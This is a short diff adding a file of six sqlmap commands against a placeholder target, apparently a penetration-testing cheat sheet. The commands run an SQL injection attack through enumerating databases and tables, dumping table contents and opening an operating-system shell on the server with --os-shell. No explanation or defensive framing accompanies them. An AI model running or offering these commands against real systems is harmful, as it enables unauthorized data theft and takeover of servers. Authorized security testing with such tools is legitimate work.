@@ -1,0 +1,6 @@
+sqlmap -u http://"$TARGET"?id=1 --dbs --batch
+sqlmap -u http://"$TARGET" --data="$POSTDATA" --method POST --level=3 --risk=2 --dbms=mysql --batch -p "$PARAM"
+sqlmap -u http://"$TARGET" --data="$POSTDATA" --dbms=mysql --batch -D "$DB" --tables
+sqlmap -u http://"$TARGET" --data="$POSTDATA" --dbms=mysql --batch -D "$DB" -T "$TABLE" --dump
+sqlmap -u http://"$TARGET" --os-shell --batch
+sqlmap --forms --batch -u http://"$TARGET"
